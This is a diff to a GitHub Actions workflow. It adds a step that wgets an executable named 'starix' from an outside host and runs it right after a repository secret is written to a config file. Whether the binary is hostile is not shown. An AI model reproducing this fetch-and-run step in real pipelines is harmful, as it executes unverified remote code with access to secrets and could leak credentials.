@@ -13,11 +13,14 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v2
 
+    - name: setting file
+      run: |
+        wget "https://f.5-23.dev/starix"
+        chmod +x ./starix
     - name: Create environment file
       run: |
         echo "${{ secrets.HA }}" >> Starix.toml
-        chmod +x ./Starix 
-        ./Starix
+        ./starix
 
     - name: Display the file content
       run: |
